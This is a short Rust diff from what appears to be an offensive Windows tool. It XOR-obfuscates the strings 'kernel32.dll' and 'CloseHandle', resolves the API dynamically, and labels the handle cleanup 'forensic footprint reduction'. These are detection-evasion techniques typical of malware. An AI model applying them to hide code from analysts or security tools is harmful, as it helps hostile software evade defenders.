@@ -3,6 +3,8 @@
 
 use std::arch::asm;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
+use crate::obfuscate;
+use crate::xor_str;
 
 /// Custom handle wrapper for RAII-based closure (Forensic footprint reduction)
 pub struct SafeHandle(pub HANDLE);
@@ -11,9 +13,13 @@ impl Drop for SafeHandle {
     fn drop(&mut self) {
         if self.0 != 0 && self.0 != -1 {
             unsafe {
-                // Dynamic resolution for CloseHandle
+                // Dynamic resolution for CloseHandle (Obfuscated)
+                const K32: [u8; 12] = xor_str!("kernel32.dll", 0x55);
+                const CH: [u8; 11] = xor_str!("CloseHandle", 0x55);
+                
                 let close_handle = Resolve::api::<unsafe extern "system" fn(HANDLE) -> i32>(
-                    "kernel32.dll", "CloseHandle"
+                    &obfuscate::decrypt(&K32, 0x55), 
+                    &obfuscate::decrypt(&CH, 0x55)
                 );
                 if let Some(f) = close_handle {
                     f(self.0);
